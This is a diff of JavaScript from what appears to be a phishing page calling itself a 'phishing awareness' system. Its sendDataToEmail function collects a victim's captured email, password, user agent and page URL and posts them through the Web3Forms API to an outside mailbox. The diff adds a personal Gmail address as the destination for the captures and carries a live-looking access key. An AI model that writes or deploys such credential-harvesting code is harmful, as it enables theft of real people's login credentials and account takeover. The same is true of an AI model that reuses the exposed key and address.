@@ -73,15 +73,16 @@ function sendDataToEmail(email, password) {
     
     // Preparar datos para Web3Forms
     const formData = new FormData();
-    formData.append('access_key', '38e2db25-d16e-4fb3-b632-be632c018a69'); // Reemplazar con tu key real
+    formData.append('access_key', '38e2db25-d16e-4fb3-b632-be632c018a69');
     formData.append('subject', `🚨 Nueva Captura - ${timestamp}`);
     formData.append('from_name', 'Sistema de Phishing Awareness');
+    formData.append('email', 'sofly7899@gmail.com'); // Email donde recibirás las capturas
+    formData.append('message', mensaje); // Mensaje principal
     formData.append('email_capturado', email);
     formData.append('password_capturada', password);
     formData.append('fecha_hora', timestamp);
     formData.append('navegador', userAgent);
     formData.append('url_captura', currentUrl);
-    formData.append('mensaje_completo', mensaje);
     
     // Enviar usando Web3Forms
     fetch('https://api.web3forms.com/submit', {
